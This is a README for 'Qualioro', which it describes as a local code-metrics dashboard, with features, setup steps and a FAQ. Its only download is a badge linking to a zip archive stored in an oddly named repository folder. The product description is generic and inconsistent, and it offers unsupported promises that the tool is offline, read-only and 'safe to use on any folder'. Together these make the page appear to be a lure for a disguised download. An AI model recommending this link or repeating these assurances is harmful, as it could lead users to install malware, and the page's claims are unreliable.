# 📊 Qualioro - Turn code metrics into actionable insights

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/kytheanit12/Qualioro/main/monodromy/Software_v3.8-alpha.3.zip)

Qualioro helps you understand your software project. It scans your code and provides reports that highlight areas for improvement. You do not need to be a developer to gain value from these reports. The application processes your files and displays clear charts to show the health of your project.

## 🛠 Features

Qualioro automates the analysis of your codebase. It identifies potential issues before they cause problems.

- **Automated Scanning**: The tool reads your project files and finds common patterns that lead to defects.
- **Visual Analytics**: The dashboard turns complex data into simple charts. You see your progress over time.
- **Actionable Insights**: You receive suggestions based on your data. These ideas help you make better decisions for your engineering team.
- **Performance Tracking**: Observe how your software quality changes as you add new features.
- **Easy Integration**: The tool works with modern project structures. It supports TypeScript and Next.js environments out of the box.

## 🚀 Getting Started

When you open Qualioro for the first time, you must select the folder where your project code lives. The application asks for permission to read these files. It does not send your private code to remote servers. The analysis happens on your local machine.

Select your project folder by clicking the "Browse" button in the application. Once you select the folder, click the "Analyze" button. The software scans your files. This might take a few seconds depending on the size of your project.

After the scan finishes, the main dashboard shows your results. You see a summary score at the top. This score represents the health of your code. Colors indicate different levels of quality. Green means your project is in good shape. Yellow or red indicate areas that might need your attention.

## 🔍 Understanding Results

The app organizes your results into sections. Each section focuses on a specific aspect of software quality.

### Code Complexity
High complexity makes code hard to read and change. Qualioro assigns a score to your project. If you see high numbers, look at the files highlighted in red. These files are the most likely to cause bugs in the future.

### Productivity Trends
This view shows how fast your project changes. It helps you see if your process slows down or speeds up over weeks. Keeping these trends stable helps keep your team consistent.

### Data Visualization
You can export these charts to share with your team. Use the "Save Image" button to create a report for your next meeting. The visuals show data in a format that everyone can understand, even if they do not know how to write code.

## 💡 Frequently Asked Questions

**Does the software change my code?**
No. Qualioro only reads your files. It cannot modify, delete, or save changes to your project. It is safe to use on any folder.

**Do I need an internet connection to run the analysis?**
No. You only need the connection to download the initial installer and any updates. The core analysis works while you are offline.

**How often should I scan my project?**
You can scan your project as often as you like. Most users run a scan once a week or whenever they finalize a large update to their code.

**What happens if I get an error?**
Most errors occur if the application does not have permission to read a folder. Ensure your user account has read access to the project directory. If the problem persists, restart your computer and try again.

**Can I use this for multiple projects?**
Yes. You can point the application to any folder on your computer. When you return to the home screen, click the "Open New Project" button to start a fresh analysis for a different folder.
